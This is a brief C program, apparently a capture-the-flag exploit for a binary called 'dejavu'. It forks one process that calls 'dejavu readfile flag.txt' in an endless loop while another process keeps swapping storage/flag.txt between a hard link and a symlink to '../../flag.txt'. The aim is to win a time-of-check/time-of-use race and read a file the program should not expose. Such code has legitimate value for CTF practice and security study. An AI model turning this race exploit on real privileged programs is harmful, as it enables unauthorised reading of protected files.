#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>

int main()
{
    mkdir("cwd", 0777);
    chdir("cwd");
    mkdir("storage", 0777);
    int fd = open("flag.txt", O_WRONLY|O_CREAT, 0777);
    char wtf[100] = {0};
    write(fd, wtf, 100);
    close(fd);
    if(!fork())
    {
        for(;;)
        {
            if(!fork())
                execl("../dejavu", "dejavu", "readfile", "flag.txt", (void*)0);
            wait(NULL);
        }
    }
    else
    {
        for(;;)
        {
            unlink("storage/flag.txt");
            link("flag.txt", "storage/flag.txt");
            usleep(100);
            symlink("../../flag.txt", "storage/xyu.txt");
            rename("storage/xyu.txt", "storage/flag.txt");
        }
    }
}
